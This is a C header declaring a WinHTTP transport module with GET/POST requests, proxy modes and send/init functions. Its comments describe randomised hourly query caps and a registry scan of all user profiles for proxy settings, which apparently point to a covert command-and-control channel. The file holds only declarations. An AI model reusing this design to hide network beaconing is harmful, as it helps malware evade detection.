/*
	transport_WinHTTP.h
*/

#pragma once
#include <Windows.h>
#include <winhttp.h>

#include "transport_Generic.h"

// internal structure assigned to global init context at TRANSPORT_HANDLE->pInternalModuleContext
typedef struct _WHT_INTERNAL_CONTEXT {

	HINTERNET hSession;	// opened WinHTTP session handle

	// wait-related vars
	WORD wWaitHour;	// specifies a current hour, if it changes -> counter values are emptied
	DWORD dwQueryCountCurrentHour;	// amount of queries issued in current hour
	DWORD dwMaxQueryCountSelected;	// updated each hour with a random value from range [MAX_QUERIES_IN_HOUR_MIN..MAX_QUERIES_IN_HOUR_MAX]

} WHT_INTERNAL_CONTEXT, *PWHT_INTERNAL_CONTEXT;

typedef enum WHT_QUERY_TYPE {
	REQUEST_TYPE_GET = 1,
	REQUEST_TYPE_POST
};

// type of connection used
typedef enum WHT_CONNECTION_TYPE
{
	CONNECTION_DIRECT = 0,			// no proxy at all
	CONNECTION_WPAD_AUTOPROXY,		// attempt WPAD proxy auto discovery
	CONNECTION_PROXY_CONFIGURED,	// auto proxy retrieval as defined for WinHTTP
	CONNECTION_PROXY_DISCOVERED		// proxy settings, discovered as a result of registry scan for all available user profiles
};

// callback for tswhttpEnumUserProxy()
typedef BOOL (CALLBACK *CBENUMUSERPROXY) (LPWSTR, LPVOID);

HINTERNET _tswhttpTestConnection(WHT_CONNECTION_TYPE wcType, LPWSTR wszProxySetting);
BOOL CALLBACK tswhttpTransportSend(PTRANSPORT_HANDLE pTransport, PTRANSPORT_QUERY pQuery);

PTRANSPORT_HANDLE tswhttpInitTransport();
VOID CALLBACK tswhttpDisposeTransport(PTRANSPORT_HANDLE pTransport);